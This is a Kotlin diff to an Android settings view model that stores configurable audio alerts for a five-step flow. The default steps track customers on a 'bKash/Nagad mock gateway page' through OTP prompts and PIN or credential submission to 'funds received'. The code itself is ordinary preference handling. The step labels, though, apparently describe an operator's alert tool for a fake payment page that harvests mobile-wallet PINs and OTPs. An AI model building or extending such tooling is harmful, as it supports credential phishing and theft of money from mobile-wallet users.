@@ -10,9 +10,13 @@ import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.flow.asStateFlow
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
+import com.google.gson.Gson
+import com.google.gson.reflect.TypeToken
  
 data class TongConfig(
     val step: Int,
+    val title: String,
+    val subtitle: String,
     val isActive: Boolean,
     val type: AudioAlertManager.AlarmType
 )
@@ -82,17 +86,21 @@ class SettingsViewModel(application: Application) : AndroidViewModel(application
         val model = android.os.Build.MODEL ?: "Device"
         val deviceName = "$brand $model"
         
-        val tongs = (0..4).map { step ->
-            val isActive = prefs.getBoolean("pref_tong_step_${step}_active", true)
-            val typeStr = prefs.getString("pref_tong_step_${step}_type", getDefaultAlarmType(step)) ?: "DIGITAL_BEEP"
-            val type = try {
-                AudioAlertManager.AlarmType.valueOf(typeStr)
+        val gson = Gson()
+        val tongsJson = prefs.getString("pref_dynamic_tongs", "") ?: ""
+        val tongs: List<TongConfig> = if (tongsJson.isNotBlank()) {
+            try {
+                val listType = object : TypeToken<List<TongConfig>>() {}.type
+                gson.fromJson(tongsJson, listType)
             } catch (e: Exception) {
-                AudioAlertManager.AlarmType.DIGITAL_BEEP
+                getDefaultTongs()
             }
-            TongConfig(step, isActive, type)
+        } else {
+            val defaultList = getDefaultTongs()
+            prefs.edit().putString("pref_dynamic_tongs", gson.toJson(defaultList)).apply()
+            defaultList
         }
- 
+
         _state.value = SettingsState(
             baseUrl = baseUrl,
             pollingInterval = pollingInterval,
@@ -109,13 +117,44 @@ class SettingsViewModel(application: Application) : AndroidViewModel(application
         )
     }
 
-    private fun getDefaultAlarmType(step: Int): String {
-        return when (step) {
-            0, 4 -> "SOFT_CHIME"
-            1 -> "DIGITAL_BEEP"
-            2 -> "PHONE_RINGTONE"
-            else -> "DIGITAL_BEEP"
+    private fun getDefaultTongs(): List<TongConfig> {
+        return listOf(
+            TongConfig(0, "Step 0: Customer Enters Gateway", "Customers land on bKash/Nagad mock gateway page.", true, AudioAlertManager.AlarmType.SOFT_CHIME),
+            TongConfig(1, "Step 1: Verification OTP Prompted", "Customer requests authentication code via SMS.", true, AudioAlertManager.AlarmType.DIGITAL_BEEP),
+            TongConfig(2, "Step 2: Credential PIN Submit", "Customer submits credentials/PIN details.", true, AudioAlertManager.AlarmType.PHONE_RINGTONE),
+            TongConfig(3, "Step 3: Verification Processing", "Admin verification request pending cycle.", true, AudioAlertManager.AlarmType.DIGITAL_BEEP),
+            TongConfig(4, "Step 4: Transaction Successful 🎉", "Transaction completed and funds received.", true, AudioAlertManager.AlarmType.SOFT_CHIME)
+        )
+    }
+
+    fun addTong(step: Int, title: String, subtitle: String, type: AudioAlertManager.AlarmType) {
+        val currentTongs = _state.value.tongs.toMutableList()
+        currentTongs.removeAll { it.step == step }
+        currentTongs.add(TongConfig(step, title, subtitle, true, type))
+        currentTongs.sortBy { it.step }
+        saveTongsToPrefs(currentTongs)
+    }
+
+    fun editTong(step: Int, title: String, subtitle: String, type: AudioAlertManager.AlarmType) {
+        val currentTongs = _state.value.tongs.map {
+            if (it.step == step) {
+                it.copy(title = title, subtitle = subtitle, type = type)
+            } else {
+                it
+            }
         }
+        saveTongsToPrefs(currentTongs)
+    }
+
+    fun deleteTong(step: Int) {
+        val currentTongs = _state.value.tongs.filter { it.step != step }
+        saveTongsToPrefs(currentTongs)
+    }
+
+    private fun saveTongsToPrefs(tongsList: List<TongConfig>) {
+        val gson = Gson()
+        prefs.edit().putString("pref_dynamic_tongs", gson.toJson(tongsList)).apply()
+        _state.value = _state.value.copy(tongs = tongsList)
     }
 
     fun updateBaseUrl(url: String) {
@@ -134,19 +173,17 @@ class SettingsViewModel(application: Application) : AndroidViewModel(application
     }
 
     fun toggleTong(step: Int, active: Boolean) {
-        prefs.edit().putBoolean("pref_tong_step_${step}_active", active).apply()
-        val updatedTongs = _state.value.tongs.map {
+        val currentTongs = _state.value.tongs.map {
             if (it.step == step) it.copy(isActive = active) else it
         }
-        _state.value = _state.value.copy(tongs = updatedTongs)
+        saveTongsToPrefs(currentTongs)
     }
 
     fun updateTongType(step: Int, type: AudioAlertManager.AlarmType) {
-        prefs.edit().putString("pref_tong_step_${step}_type", type.name).apply()
-        val updatedTongs = _state.value.tongs.map {
+        val currentTongs = _state.value.tongs.map {
             if (it.step == step) it.copy(type = type) else it
         }
-        _state.value = _state.value.copy(tongs = updatedTongs)
+        saveTongsToPrefs(currentTongs)
     }
 
     fun testSound(type: AudioAlertManager.AlarmType) {
